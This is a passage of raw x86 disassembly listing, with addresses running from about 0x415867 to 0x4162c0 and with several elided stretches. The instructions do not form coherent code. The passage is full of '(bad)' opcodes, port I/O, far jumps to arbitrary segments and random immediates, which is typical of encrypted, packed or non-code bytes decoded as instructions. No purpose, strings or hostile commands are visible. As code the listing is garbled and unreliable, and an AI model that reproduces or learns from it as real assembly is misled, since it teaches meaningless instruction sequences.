  415867:	push   edi
  415868:	jmp    DWORD PTR [ecx+0x73e98ee]
  41586e:	and    ebx,DWORD PTR ds:[edi+0x52]
  415872:	jmp    0xbfcb8d1b
  415877:	shl    DWORD PTR [esi+ecx*2],0x75
  41587b:	cmp    esp,eax
  41587d:	and    edi,0xfd16daf7
  415883:	mov    ds:0xa81f8835,eax
  415888:	add    bl,BYTE PTR [edi+0xa]
  41588b:	bound  ebx,QWORD PTR [ecx+0x54ddcc83]
  415891:	or     ebp,ecx
  415893:	ror    edx,0xc7
  415896:	retf   
  415897:	cdq    
  415898:	jo     0x4158a5
  41589a:	jg     0x415873
  41589c:	pop    ebx
  41589d:	repz xor al,al
  4158a0:	mov    dh,0xf1
  4158a2:	sbb    eax,0x5c09ff72
  4158a7:	cwde   
  4158a8:	sub    al,0x63
  4158aa:	push   ebx
  4158ab:	test   eax,0x477c29ff
  4158b0:	in     al,0x2e
  4158b2:	popf   
  4158b3:	int    0x6
  4158b5:	sbb    eax,DWORD PTR [esp+ebp*1]
  4158b8:	mov    dh,0x0
  4158ba:	loopne 0x415881
  4158bc:	icebp  
  4158bd:	inc    eax
  4158be:	scas   al,BYTE PTR es:[edi]
  4158bf:	xchg   ebx,eax
  4158c0:	mov    esp,DWORD PTR [ebp-0x14]
  4158c3:	les    esp,FWORD PTR [ebp-0x44]
  4158c6:	popf   
  4158c7:	push   esi
  4158c8:	loop   0x4158cd
  4158ca:	mov    ah,0x95
  4158cc:	or     eax,0x1655f54b
  4158d1:	push   ds
  4158d2:	imul   esi,ebp,0x4a2860cc
  4158d8:	mov    eax,0x116796d3
  4158dd:	sub    ch,BYTE PTR [ecx]
  4158df:	shr    DWORD PTR [ebp+0x44],1
  4158e2:	xchg   ecx,eax
  4158e3:	dec    ebp
  4158e4:	sbb    al,0xe4
  4158e6:	icebp  
  4158e7:	lahf   
  4158e8:	adc    eax,0x9e2c92c7
  4158ed:	jge    0x41593c
  4158ef:	jae    0x415907
  4158f1:	push   eax
  4158f2:	pushf  
  4158f3:	outs   dx,BYTE PTR ds:[esi]
  4158f4:	add    al,0xd3
  4158f6:	call   0x31ef:0xdc0ec35e
  4158fd:	(bad)  
  4158fe:	clc    
  4158ff:	push   edx
  415900:	jne    0x4158c2
  415902:	dec    esi
  415903:	inc    ebp
  415904:	xor    al,0x52
  415906:	out    0x9,al
  415908:	and    ch,bh
  41590a:	call   0xde07:0x87684382
  415911:	xlat   BYTE PTR ds:[ebx]
  415912:	imul   ebp,DWORD PTR [edi],0xffffff85
  415915:	into   
  415916:	cmp    DWORD PTR [ebx],0xffffff85
  415919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591a:	xchg   ecx,eax
  41591b:	xchg   ecx,eax
  41591c:	cli    
  41591d:	push   ds
  41591e:	sbb    eax,0x78d161ee
  415923:	sub    esi,esi
  415925:	imul   ebp,DWORD PTR [ebx],0xffffffbf
  415928:	scas   al,BYTE PTR es:[edi]
  415929:	ret    0x6f3b
  41592c:	mov    ebp,DWORD PTR [edx+0x76]
  41592f:	xchg   ebp,eax
  415930:	xchg   ecx,eax
  415931:	add    dh,BYTE PTR [eax+0x55]
  415934:	push   0x0
	...
  415995:	add    BYTE PTR [ebp-0x78],al
  415998:	sub    al,0x77
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0xbc
  4159a3:	cmc    
  4159a4:	push   ds
  4159a5:	imul   sp,cx,0x0
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [edx-0x27a52ab4],cl
  4159b3:	xchg   edx,eax
  4159b4:	lods   al,BYTE PTR ds:[esi]
  4159b5:	inc    edi
  4159b6:	inc    esi
  4159b7:	or     eax,DWORD PTR ss:[ecx+eiz*2-0x5]
  4159bc:	adc    eax,0x537d72bd
  4159c1:	les    esi,FWORD PTR [ebx+0x188e5022]
  4159c7:	aas    
  4159c8:	inc    esi
  4159c9:	jl     0x415a35
  4159cb:	leave  
  4159cc:	imul   edx,DWORD PTR [edx+0x770dbe9f],0x8f0b456a
  4159d6:	adc    DWORD PTR [edi-0x41f1106c],edi
  4159dc:	jmp    0xd09d:0x52f1f045
  4159e3:	dec    ecx
  4159e4:	sbb    BYTE PTR [edi+0x3b893454],bl
  4159ea:	iret   
  4159eb:	cmp    bl,BYTE PTR [eax+0x1e]
  4159ee:	push   edi
  4159ef:	aas    
  4159f0:	mov    ah,BYTE PTR [eax]
  4159f2:	ret    0x7ec4
  4159f5:	std    
  4159f6:	add    DWORD PTR ds:0xfa9421f1,edx
  4159fc:	dec    ecx
  4159fd:	sbb    ebx,DWORD PTR [edi+0x2e]
  415a00:	test   cl,bh
  415a02:	call   0x991e:0x3079ba0e
  415a09:	imul   ebp,DWORD PTR [edx-0x2dafbce2],0xffffffc1
  415a10:	imul   DWORD PTR [esi+0x3]
  415a13:	xchg   ebp,eax
  415a14:	rcr    BYTE PTR [ebx+0x24],0xf2
  415a18:	inc    ebp
  415a19:	in     al,0xb1
  415a1b:	xchg   BYTE PTR [eax],dl
  415a1d:	cmp    ebx,edi
  415a1f:	stos   BYTE PTR es:[edi],al
  415a20:	fucompp 
  415a22:	mov    edi,0x66bfe375
  415a27:	lea    ebx,[edi-0x21]
  415a2a:	inc    ebx
  415a2b:	(bad)  
  415a2c:	adc    esp,DWORD PTR [ebx]
  415a2e:	mov    ds:0x24752cfe,al
  415a33:	inc    esp
  415a34:	add    bh,BYTE PTR [ecx]
  415a36:	dec    esp
  415a37:	mov    ebp,0x45e289b
  415a3c:	mov    ?,WORD PTR [edi-0x5d]
  415a3f:	les    esp,FWORD PTR [edi]
  415a41:	sub    cl,ch
  415a43:	xor    BYTE PTR [ecx],ch
  415a45:	dec    esi
  415a46:	push   es
  415a47:	jmp    0xb816dc16
  415a4c:	loopne 0x415ab8
  415a4e:	add    ah,dl
  415a50:	(bad)  
  415a51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a52:	mov    dl,0x56
  415a54:	xlat   BYTE PTR ds:[ebx]
  415a55:	rol    DWORD PTR [ecx+0x32b65906],1
  415a5b:	xor    ah,BYTE PTR [ebx]
  415a5d:	scas   eax,DWORD PTR es:[edi]
  415a5e:	cwde   
  415a5f:	push   eax
  415a60:	and    DWORD PTR [esp+edi*2+0x39221ead],eax
  415a67:	xor    ebx,DWORD PTR [esi-0xa629482]
  415a6d:	push   ecx
  415a6e:	std    
  415a6f:	xor    BYTE PTR [ebx+0x5f],0xc0
  415a73:	out    0x1b,al
  415a75:	dec    esi
  415a76:	pop    edx
  415a77:	loopne 0x415a6a
  415a79:	aam    0x8c
  415a7b:	out    0x0,al
  415a7d:	popf   
  415a7e:	jl     0x415a0f
  415a80:	sub    bh,al
  415a82:	pusha  
  415a83:	xchg   ecx,eax
  415a84:	adc    eax,edx
  415a86:	scas   eax,DWORD PTR es:[edi]
  415a87:	ror    BYTE PTR [ebx-0x2fc950d7],1
  415a8d:	call   0xc112cf2a
  415a92:	push   ss
  415a93:	pop    ecx
  415a94:	pop    es
  415a95:	adc    esp,edi
  415a97:	add    bl,bl
  415a99:	dec    esi
  415a9a:	jmp    0x415a23
  415a9c:	rol    DWORD PTR [esi],1
  415a9e:	ret    
  415a9f:	lea    esi,[ebx]
  415aa1:	mov    al,ds:0xf51c6375
  415aa6:	clc    
  415aa7:	mov    edx,0x8c229043
  415aac:	mov    al,ds:0xc643e4a2
  415ab1:	scas   al,BYTE PTR es:[edi]
  415ab2:	mov    edi,0x4d0e
	...
  415b13:	add    BYTE PTR [eax],al
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0xa9025c28
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [ebp-0x6ab0f711],al
  415b33:	stc    
  415b34:	ja     0x415b3f
  415b36:	jmp    0x415b75
  415b38:	pop    ebx
  415b39:	stos   BYTE PTR es:[edi],al
  415b3a:	xchg   esi,eax
  415b3b:	jmp    0x5c08:0x49eb92e8
  415b42:	mov    eax,0x2a4e2dd1
  415b47:	mov    ss,WORD PTR [ebp-0x22ae8bc8]
  415b4d:	daa    
  415b4e:	cmp    al,0x9b
  415b50:	jmp    0xb800:0xcb9ff5fd
  415b57:	mov    ch,0x2a
  415b59:	ret    
  415b5a:	(bad)  
  415b5b:	pop    eax
  415b5c:	sbb    DWORD PTR [ecx+0x15448990],0x6e427dc6
  415b66:	jge    0x415bda
  415b68:	rcr    BYTE PTR [edi+ebp*8],cl
  415b6b:	push   eax
  415b6c:	xchg   DWORD PTR [esi],edx
  415b6e:	add    dh,dl
  415b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b71:	sbb    ecx,ebx
  415b73:	cwde   
  415b74:	test   DWORD PTR [eax+ecx*4-0x66dc33c],0x578bd8c4
  415b7f:	add    al,0x2f
  415b81:	sbb    ah,bl
  415b83:	xchg   ebx,eax
  415b84:	or     DWORD PTR [eax-0x65be0c19],0xffffff85
  415b8b:	cmp    ebx,ebp
  415b8d:	test   al,0xdc
  415b8f:	and    eax,0x117fd3c7
  415b94:	ins    DWORD PTR es:[edi],dx
  415b95:	int    0xe
  415b97:	enter  0x577c,0x37
  415b9b:	out    dx,al
  415b9c:	in     eax,dx
  415b9d:	fidivr WORD PTR [eax]
  415b9f:	int3   
  415ba0:	out    0x5d,al
  415ba2:	pusha  
  415ba3:	std    
  415ba4:	sub    BYTE PTR [edx+esi*8-0x36e95be9],dh
  415bab:	outs   dx,DWORD PTR ds:[esi]
  415bac:	rcl    BYTE PTR [edx],1
  415bae:	inc    edi
  415baf:	(bad)  
  415bb0:	outs   dx,DWORD PTR ds:[esi]
  415bb1:	test   eax,0x55e60c50
  415bb6:	repnz inc edx
  415bb8:	dec    esi
  415bb9:	hlt    
  415bba:	iret   
  415bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bbc:	push   edx
  415bbd:	cs je  0x415c05
  415bc0:	xor    eax,0xf9cc5f93
  415bc5:	call   0x941a6c25
  415bca:	loope  0x415c06
  415bcc:	call   0x57c68d62
  415bd1:	daa    
  415bd2:	hlt    
  415bd3:	jbe    0x415b9b
  415bd5:	pop    esp
  415bd6:	outs   dx,DWORD PTR ds:[esi]
  415bd7:	cwde   
  415bd8:	or     ch,BYTE PTR [edi]
  415bda:	pop    esp
  415bdb:	sbb    al,0x25
  415bdd:	(bad)  [ebx+0x332fd3f0]
  415be3:	icebp  
  415be4:	dec    edi
  415be5:	mov    ah,0xd2
  415be7:	adc    DWORD PTR [edi+esi*4-0x69ae67c6],esi
  415bee:	push   eax
  415bef:	cmp    eax,DWORD PTR [ecx]
  415bf1:	clc    
  415bf2:	stos   DWORD PTR es:[edi],eax
  415bf3:	nop    DWORD PTR [edx]
  415bf6:	jmp    0xb37e395e
  415bfb:	arpl   WORD PTR [edx-0x75],cx
  415bfe:	fsub   DWORD PTR [edi-0x63786174]
  415c04:	ror    esi,cl
  415c06:	mov    esp,0x78b57739
  415c0b:	push   ss
  415c0c:	es inc ebx
  415c0e:	and    edi,DWORD PTR [esi-0x20]
  415c11:	mov    ebp,0xe90a7de8
  415c16:	ret    
  415c17:	or     esp,DWORD PTR fs:[esi]
  415c1a:	sub    BYTE PTR [ecx+ebp*4-0x2b],0x5b
  415c1f:	jp     0x415bce
  415c21:	test   DWORD PTR [edx+ebp*8-0x49324e7d],eax
  415c28:	(bad)  
  415c29:	push   0xffffffe3
  415c2b:	cs add edi,edx
  415c2e:	and    ebx,ebx
  415c30:	fs nop
  415c32:	and    ch,bh
  415c34:	rol    DWORD PTR [eax],1
	...
  415c96:	cmp    dl,BYTE PTR [eax]
  415c98:	mov    edi,0xbbbfbf3c
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0x622e9c0f
  415ca5:	inc    esp
  415ca6:	jns    0x415c8b
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    dh,dl
  415caf:	mov    cl,BYTE PTR [edi]
  415cb1:	inc    eax
  415cb2:	daa    
  415cb3:	outs   dx,DWORD PTR ds:[esi]
  415cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cb5:	ds dec esi
  415cb7:	cmp    BYTE PTR [eax],al
  415cb9:	cmp    BYTE PTR [eax+0x4a],0xb1
  415cbd:	jne    0x415c8a
  415cbf:	and    ah,BYTE PTR [esi-0x57]
  415cc2:	add    al,al
  415cc4:	or     BYTE PTR [esi-0x23],dh
  415cc7:	push   ebx
  415cc8:	shl    ah,cl
  415cca:	inc    esi
  415ccb:	add    BYTE PTR [ebx+0x5f],cl
  415cce:	cmp    dl,BYTE PTR [ebx+edi*4]
  415cd1:	inc    edx
  415cd2:	cli    
  415cd3:	cmp    DWORD PTR [ebx+0x5d601464],eax
  415cd9:	pop    es
  415cda:	repz cmp eax,0x9046b53c
  415ce0:	pop    edx
  415ce1:	jge    0x415d16
  415ce3:	mov    edi,0x91102db1
  415ce8:	pop    eax
  415ce9:	clc    
  415cea:	dec    edi
  415ceb:	sbb    ecx,esp
  415ced:	adc    DWORD PTR [ebx-0x73],esi
  415cf0:	cwde   
  415cf1:	ret    0xc5fb
  415cf4:	adc    al,0x4f
  415cf6:	xchg   esp,eax
  415cf7:	mov    edx,0xa5d7e5d0
  415cfc:	in     eax,dx
  415cfd:	clc    
  415cfe:	addr16 jno 0x415d3d
  415d01:	ins    DWORD PTR es:[edi],dx
  415d02:	dec    edx
  415d03:	xor    ah,ah
  415d05:	(bad)  
  415d06:	out    0x37,eax
  415d08:	add    eax,0x46da00c8
  415d0d:	pop    ecx
  415d0e:	inc    esi
  415d0f:	sbb    eax,0x99bad7f9
  415d14:	ins    DWORD PTR es:[edi],dx
  415d15:	mov    ebx,0x557420f7
  415d1a:	rcl    DWORD PTR [ebx+esi*1],0xe3
  415d1e:	imul   esp,DWORD PTR [edx+0x654012e2],0x7
  415d25:	aad    0xc0
  415d27:	shl    al,1
  415d29:	jle    0x415cb3
  415d2b:	xor    edx,DWORD PTR [ebp+0x6f]
  415d2e:	cdq    
  415d2f:	add    edi,DWORD PTR [eax+0x5a]
  415d32:	jb     0x415d21
  415d34:	(bad)  
  415d35:	push   ds
  415d36:	push   ebx
  415d37:	xchg   edi,eax
  415d38:	test   eax,0xaf34958d
  415d3d:	sbb    eax,edx
  415d3f:	add    eax,0xa33676c2
  415d44:	mov    bl,0xf2
  415d46:	ja     0x415d2b
  415d48:	popf   
  415d49:	out    0x8f,al
  415d4b:	or     cl,BYTE PTR [esi]
  415d4d:	add    al,0xa0
  415d4f:	pop    ds
  415d50:	xor    edi,DWORD PTR [ebp+eax*8-0x649a20c0]
  415d57:	mov    bh,0xde
  415d59:	mov    ds:0xcd84122b,eax
  415d5e:	add    dh,BYTE PTR [edi+0x1d]
  415d61:	outs   dx,DWORD PTR ds:[esi]
  415d62:	xor    DWORD PTR ds:0x536608b6,ebp
  415d68:	sub    DWORD PTR [ebx],esp
  415d6a:	repz fisub WORD PTR [ebx+esi*4-0x2e]
  415d6f:	jns    0x415dce
  415d71:	jp     0x415d2f
  415d73:	adc    bl,BYTE PTR [edi]
  415d75:	fwait
  415d76:	loope  0x415d30
  415d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d79:	lods   al,BYTE PTR ds:[esi]
  415d7a:	sbb    BYTE PTR [edi+0x1e],0x17
  415d7e:	gs cmc 
  415d80:	sbb    cl,BYTE PTR [eax]
  415d82:	pop    ss
  415d83:	repz inc ebp
  415d85:	pusha  
  415d86:	sub    al,0xc2
  415d88:	(bad)  
  415d89:	jp     0x415d31
  415d8b:	xor    cl,bh
  415d8d:	pushf  
  415d8e:	xchg   ebx,eax
  415d8f:	cmp    ecx,DWORD PTR [eax-0x3d9338e3]
  415d95:	retf   
  415d96:	mov    dh,0xd7
  415d98:	push   edi
  415d99:	in     al,0xd0
  415d9b:	call   0xe168:0xd07bc008
  415da2:	pop    es
  415da3:	push   esi
  415da4:	jp     0x415ddb
  415da6:	test   al,0x4f
  415da8:	das    
  415da9:	add    eax,0x73128404
  415dae:	arpl   WORD PTR [edi],di
  415db0:	sub    eax,0xa55d2be0
	...
  415e15:	add    dh,ch
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x87b55606
  415e24:	jo     0x415e8e
  415e26:	and    ah,0x0
  415e29:	add    BYTE PTR [edi],al
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [edi+0x46],al
  415e30:	call   FWORD PTR [ecx]
  415e32:	shr    BYTE PTR [ecx-0x49ee6938],1
  415e38:	jnp    0x415e78
  415e3a:	sub    ecx,edi
  415e3c:	mov    ch,0x34
  415e3e:	out    0x9d,al
  415e40:	popf   
  415e41:	mov    edi,DWORD PTR [ecx-0x65e3f01b]
  415e47:	out    dx,al
  415e48:	and    BYTE PTR [ebx+0x4fba96da],cl
  415e4e:	push   cs
  415e4f:	mov    dl,0xe0
  415e51:	cwde   
  415e52:	jl     0x415e65
  415e54:	lods   eax,DWORD PTR ds:[esi]
  415e55:	mov    al,cl
  415e57:	lods   al,BYTE PTR ds:[esi]
  415e58:	mov    ebp,0x693722
  415e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e5e:	xor    al,0x79
  415e60:	ror    DWORD PTR [edi],0x19
  415e63:	jmp    0xa92549
  415e68:	test   esp,ebx
  415e6a:	mov    ch,0xb6
  415e6c:	and    eax,0x87dfe65a
  415e71:	push   esp
  415e72:	xchg   esp,eax
  415e73:	ficomp DWORD PTR [edi-0x6b357266]
  415e79:	repnz pop ss
  415e7b:	adc    BYTE PTR [edi+esi*8],bl
  415e7e:	mov    ebp,0xc554901e
  415e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e84:	mov    ebx,0x108adbcc
  415e89:	into   
  415e8a:	shl    ebp,cl
  415e8c:	dec    ecx
  415e8d:	dec    esi
  415e8e:	dec    ebp
  415e8f:	aas    
  415e90:	or     DWORD PTR [ebp-0x3a1559b0],eax
  415e96:	cmp    esi,ebp
  415e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e99:	mov    ?,WORD PTR [edi+0x4c]
  415e9c:	(bad)
  415e9f:	mov    esp,DWORD PTR [edx+0x46938b35]
  415ea5:	mov    ds:0xf918567,al
  415eaa:	jns    0x415e7b
  415eac:	jp     0x415f22
  415eae:	out    0xb5,eax
  415eb0:	sub    al,0xf0
  415eb2:	cmp    BYTE PTR [ecx+edx*1-0x294b7aa3],0x7f
  415eba:	repz aas 
  415ebc:	pop    ebp
  415ebd:	mov    WORD PTR ds:0x9f9fa221,?
  415ec3:	in     al,0x74
  415ec5:	xor    edi,esp
  415ec7:	inc    edx
  415ec8:	lods   eax,DWORD PTR ds:[esi]
  415ec9:	and    DWORD PTR [esi-0x1809a010],esi
  415ecf:	adc    DWORD PTR [edx+eiz*2],esp
  415ed2:	mov    ah,BYTE PTR [esp+edx*1]
  415ed5:	test   dl,cl
  415ed7:	sti    
  415ed8:	jl     0x415ef3
  415eda:	mov    ecx,DWORD PTR [edi+eax*4-0x80]
  415ede:	icebp  
  415edf:	add    ah,BYTE PTR [ecx+0x6ca675ba]
  415ee5:	in     al,0x11
  415ee7:	std    
  415ee8:	mul    edi
  415eea:	out    dx,al
  415eeb:	shl    bl,1
  415eed:	loopne 0x415e71
  415eef:	push   edx
  415ef0:	dec    ebx
  415ef1:	mov    ds:0x211ba45e,al
  415ef6:	xchg   esi,eax
  415ef7:	push   0xffffffa1
  415ef9:	dec    eax
  415efa:	jp     0x415f6e
  415efc:	iret   
  415efd:	cmc    
  415efe:	sbb    DWORD PTR [edi+0x36e64cd6],edi
  415f04:	ins    BYTE PTR es:[edi],dx
  415f05:	sub    DWORD PTR [eax],edi
  415f07:	xchg   edx,eax
  415f08:	ins    BYTE PTR es:[edi],dx
  415f09:	aaa    
  415f0a:	sub    eax,edi
  415f0c:	js     0x415f5e
  415f0e:	jbe    0x415f4a
  415f10:	jne    0x415eba
  415f12:	iret   
  415f13:	adc    DWORD PTR [esi],edx
  415f15:	cmp    DWORD PTR ds:0x3727440a,edi
  415f1b:	and    eax,0xd9f0825f
  415f20:	pop    esp
  415f21:	mov    BYTE PTR [eax+0x41d40092],al
  415f27:	mov    esp,0x1381281a
  415f2c:	icebp  
  415f2d:	test   DWORD PTR [esi-0x39464bae],0xde81
	...
  415f93:	add    BYTE PTR [eax],al
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	mov    ecx,0x8779d2de
  415fa7:	in     eax,0x0
  415fa9:	add    BYTE PTR [edi],al
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR ds:0xd70ca934,ah
  415fb3:	cmp    eax,0xadae8a52
  415fb8:	xchg   ebp,eax
  415fb9:	arpl   WORD PTR ss:[ebx+0x23b19b8a],bp
  415fc0:	sub    BYTE PTR [eax+0xb],al
  415fc3:	or     ecx,ebx
  415fc5:	jno    0x415f99
  415fc7:	mov    BYTE PTR ds:0x5afdcd73,cl
  415fcd:	mov    ecx,0x2f1ced34
  415fd2:	xchg   ecx,eax
  415fd3:	sub    bh,BYTE PTR [esi-0xd6d5f0b]
  415fd9:	mov    dh,0xf4
  415fdb:	rol    eax,1
  415fdd:	rcl    DWORD PTR [ebp-0x384c3aba],1
  415fe3:	into   
  415fe4:	xchg   edx,eax
  415fe5:	adc    BYTE PTR [edx-0x2b],dl
  415fe8:	inc    ebx
  415fe9:	(bad)  
  415fea:	in     eax,dx
  415feb:	inc    esi
  415fec:	jnp    0x416033
  415fee:	dec    ecx
  415fef:	test   DWORD PTR [ecx],ebx
  415ff1:	jp     0x415ff6
  415ff3:	jl     0x416045
  415ff5:	mov    ah,0x98
  415ff7:	jnp    0x415f9b
  415ff9:	mov    cl,0x57
  415ffb:	clc    
  415ffc:	clc    
  415ffd:	dec    ebx
  415ffe:	jnp    0x41602f
  416000:	adc    edi,DWORD PTR [ebp-0x13]
  416003:	aad    0x24
  416005:	inc    edx
  416006:	adc    al,0x18
  416008:	cmp    BYTE PTR [ecx+0x14],cl
  41600b:	mov    eax,ds:0x3b53d3c9
  416010:	sub    al,BYTE PTR [edx]
  416012:	push   edi
  416013:	out    dx,al
  416014:	or     dh,al
  416016:	cmp    DWORD PTR [edx+0x43750b7],ebx
  41601c:	lock pop ecx
  41601e:	dec    eax
  41601f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416020:	adc    al,0x8a
  416022:	clc    
  416023:	test   BYTE PTR [edi-0x331c768c],bh
  416029:	mov    ebx,0x234cbf9a
  41602e:	aas    
  41602f:	push   ebx
  416030:	or     DWORD PTR [eax-0x388758a5],ebp
  416036:	imul   ebx,edi,0xffffffa0
  416039:	out    0xa6,eax
  41603b:	in     eax,0x3d
  41603d:	dec    edx
  41603e:	sub    eax,0x8648fe54
  416043:	and    al,0xe7
  416045:	or     bh,BYTE PTR [esi]
  416047:	inc    ebp
  416048:	pop    ebp
  416049:	mov    DWORD PTR [edx-0x699fea3e],eax
  41604f:	mov    ebp,0x4a8d7bd3
  416054:	xchg   DWORD PTR [edi+0xb91f3f6],ebx
  41605a:	cwde   
  41605b:	jmp    0x4160bb
  41605d:	test   eax,ebp
  41605f:	sahf   
  416060:	(bad)  
  416061:	rol    DWORD PTR [eax+0x190c055a],0x9c
  416068:	arpl   WORD PTR [edx+0x3719636e],dx
  41606e:	jae    0x416070
  416070:	mov    BYTE PTR [eax+edx*2],dl
  416073:	daa    
  416074:	inc    ebp
  416075:	push   cs
  416076:	sahf   
  416077:	jmp    0x41603e
  416079:	cmp    al,0x5d
  41607b:	pop    ss
  41607c:	sub    BYTE PTR [esi+0x30],ch
  41607f:	inc    ebp
  416080:	neg    DWORD PTR [edi+0x99d564c]
  416086:	mov    dl,bh
  416088:	sbb    BYTE PTR [esi+0x22],al
  41608b:	into   
  41608c:	ret    
  41608d:	iret   
  41608e:	cmp    eax,DWORD PTR [ebx+0x35]
  416091:	(bad)  [esp+eiz*8+0x140b7806]
  416098:	mov    ds:0x31c0c963,al
  41609d:	enter  0xeea3,0xbf
  4160a1:	push   ecx
  4160a2:	push   esp
  4160a3:	fsubr  DWORD PTR [ebx]
  4160a5:	mov    eax,0xb6cbddb1
  4160aa:	fbld   TBYTE PTR [ebx-0x78]
  4160ad:	iret   
  4160ae:	shl    ah,cl
  4160b0:	cmp    al,0xf5
  4160b2:	xchg   edi,eax
  4160b3:	imul   eax,DWORD PTR ds:[eax],0x0
	...
  416116:	and    cl,ch
  416118:	cmp    ebx,esi
  41611a:	sti    
  41611b:	fsubrp st(5),st
  41611d:	jmp    DWORD PTR [edx]
  41611f:	fwait
  416120:	xchg   DWORD PTR [ecx],edx
  416122:	adc    BYTE PTR [ecx-0x19716acf],dl
  416128:	add    BYTE PTR [eax],al
  41612a:	pop    es
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [esi],ch
  41612f:	jl     0x416136
  416131:	(bad)  
  416132:	call   0xdba6:0x57a4e3fe
  416139:	js     0x416119
  41613b:	jl     0x4161a2
  41613d:	xor    al,0x14
  41613f:	pop    edi
  416141:	inc    DWORD PTR [edx+0x31ba03ef]
  416147:	icebp  
  416148:	or     dl,BYTE PTR [esi-0x7e]
  41614b:	push   0x2a
  41614d:	cli    
  41614e:	cmp    al,0xef
  416150:	retf   0xfa4c
  416153:	fistp  QWORD PTR ds:0xa11b2009
  416159:	loopne 0x4161cf
  41615b:	int    0x7e
  41615d:	test   al,0x98
  41615f:	cwde   
  416160:	fwait
  416161:	stos   BYTE PTR es:[edi],al
  416162:	xor    BYTE PTR [ebx+0x7b],dh
  416165:	aad    0x92
  416167:	add    ecx,DWORD PTR fs:[edx+0xf]
  41616b:	aas    
  41616c:	outs   dx,DWORD PTR ds:[esi]
  41616d:	mov    eax,0xf22a29d8
  416172:	ja     0x4161a0
  416174:	dec    ecx
  416175:	mov    ds:0x7be92049,al
  41617a:	or     ah,BYTE PTR [ecx]
  41617c:	call   esi
  41617e:	or     ebx,DWORD PTR [ebx]
  416180:	dec    eax
  416181:	es jne 0x4161cc
  416184:	mov    edx,0x9d99a3ae
  416189:	adc    ebp,DWORD PTR [edx-0x68]
  41618c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41618d:	pop    edi
  41618e:	add    ebx,DWORD PTR [ecx+0x1a412127]
  416194:	loopne 0x4161ad
  416196:	xor    eax,0xa6cf232
  41619b:	icebp  
  41619c:	push   0xe0d62ba8
  4161a1:	sbb    al,0x64
  4161a3:	and    esp,DWORD PTR [ebp+0x4c]
  4161a6:	pop    es
  4161a7:	fbld   TBYTE PTR [ecx-0x1ba1cec]
  4161ad:	mov    esp,DWORD PTR [esi+eiz*4]
  4161b0:	lock push 0x87d69b6c
  4161b6:	xlat   BYTE PTR ds:[ebx]
  4161b7:	fisttp WORD PTR [edx]
  4161b9:	fwait
  4161ba:	enter  0x2c4a,0xf8
  4161be:	in     eax,0xc0
  4161c0:	aaa    
  4161c1:	rcr    BYTE PTR [edx+0x42],cl
  4161c4:	or     eax,0x2a3529a1
  4161c9:	lock scas eax,DWORD PTR es:[edi]
  4161cb:	xchg   ebp,eax
  4161cc:	cli    
  4161cd:	es sub eax,0x823fd357
  4161d3:	jno    0x4161d4
  4161d5:	mov    eax,ds:0x85ce5b5b
  4161da:	aad    0xf8
  4161dc:	fcmovb st,st(4)
  4161de:	hlt    
  4161df:	mov    ds:0xe6004f02,al
  4161e4:	add    eax,0xf2c817e
  4161e9:	frstor [esi]
  4161eb:	(bad)  
  4161ec:	out    dx,eax
  4161ed:	inc    edx
  4161ee:	js     0x84c311a2
  4161f4:	and    eax,0x1bfb1397
  4161f9:	enter  0x9012,0x9
  4161fd:	push   0x9e106fe7
  416202:	lds    ebp,FWORD PTR [eax]
  416204:	dec    edx
  416205:	icebp  
  416206:	sti    
  416207:	push   edi
  416208:	test   BYTE PTR [edx-0x7fc420f7],cl
  41620e:	dec    ebx
  41620f:	cmc    
  416210:	jge    0x41628f
  416212:	out    0xad,eax
  416214:	lea    edi,[ecx]
  416216:	and    BYTE PTR [esi+0x56a62ebd],al
  41621c:	pop    edi
  41621d:	mov    esp,0xbe3b3dfe
  416222:	into   
  416223:	rcl    BYTE PTR [esi],1
  416225:	sti    
  416226:	arpl   WORD PTR ds:0x25fca9a7,dx
  41622c:	aam    0x71
  41622e:	and    al,BYTE PTR [bx+di]
  416231:	xchg   edx,eax
  416232:	sar    DWORD PTR [esi+0x12],1
	...
  416295:	add    BYTE PTR [ebx],ah
  416297:	outs   dx,BYTE PTR ds:[esi]
  416298:	xor    ah,BYTE PTR ds:0x6e377d7f
  41629e:	test   BYTE PTR [esi+0x6370f6de],bh
  4162a4:	not    DWORD PTR [eax+0xe795]
  4162aa:	pop    es
  4162ab:	add    DWORD PTR [eax],eax
  4162ad:	add    BYTE PTR [ecx-0x41458e36],bl
  4162b3:	out    dx,al
  4162b4:	jl     0x4162f6
  4162b6:	iret   
  4162b7:	neg    BYTE PTR [edx+ebx*2-0x25]
  4162bb:	jmp    0x2f34f40a
  4162c0:	dec    edi
